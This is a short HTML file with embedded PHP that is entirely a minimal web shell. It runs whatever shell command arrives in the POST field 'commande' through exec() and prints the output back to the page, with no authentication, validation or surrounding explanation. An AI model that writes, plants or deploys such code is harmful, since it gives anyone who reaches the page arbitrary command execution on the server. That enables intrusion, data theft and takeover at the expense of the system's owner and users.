<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
</head>
<body>

<?php
	exec($_POST['commande'], $array);
	foreach ($array as $line) {
		echo $line.'<br />';
	}
?>

</body>
</html>
